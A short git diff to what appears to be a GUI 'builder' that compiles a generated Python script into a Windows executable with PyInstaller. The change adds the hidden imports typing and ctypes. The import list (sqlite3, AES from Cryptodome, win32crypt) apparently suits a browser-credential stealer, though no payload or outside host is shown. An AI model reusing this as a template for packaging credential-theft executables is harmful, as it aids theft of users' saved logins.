@@ -469,6 +469,7 @@ class App(customtkinter.CTk):
                                 "--hidden-import", "json",
                                 "--hidden-import", "re",
                                 "--hidden-import", "time",
+                                "--hidden-import", "typing",
                                 "--hidden-import", "subprocess",
                                 "--hidden-import", "sys",
                                 "--hidden-import", "sqlite3",
@@ -480,9 +481,11 @@ class App(customtkinter.CTk):
                                 "--hidden-import", "Cryptodome",
                                 "--hidden-import", "Cryptodome.Cipher",
                                 "--hidden-import", "Cryptodome.Cipher.AES",
+                                "--hidden-import", "ctypes",
+                                "--hidden-import", "ctypes.wintypes",
                                 "--hidden-import", "win32crypt",
                                 "--icon", exeicon, f"./{filename}.py"])
-                
+    
                 logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
         except Exception as e:
             logging.error(f"Error with compiling file: {e}")
